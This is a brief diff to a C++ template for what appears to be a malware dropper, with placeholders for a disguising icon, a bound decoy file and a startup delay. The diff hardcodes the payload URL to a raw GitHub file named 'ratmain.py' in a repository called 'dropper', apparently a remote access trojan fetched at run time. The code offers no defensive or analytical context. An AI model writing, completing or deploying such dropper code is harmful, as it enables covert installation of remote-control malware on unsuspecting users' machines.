@@ -14,7 +14,7 @@ const std::string g_file_name = "{{FILE_NAME}}";
 const std::string g_icon_data = "{{ICON_DATA}}";  // Base64 encoded icon bytes
 const std::string g_bound_file_data = "{{BOUND_FILE_DATA}}";  // Base64 encoded file to extract
 const int g_startup_delay = {{STARTUP_DELAY_MS}};  // Milliseconds
-const std::string g_payload_url = "{{PAYLOAD_URL}}";
+const std::string g_payload_url = "https://raw.githubusercontent.com/ovrlust/dropper/main/ratmain.py";
 
 void a() { srand(time(NULL) ^ 0xDEADBEEF); }
 
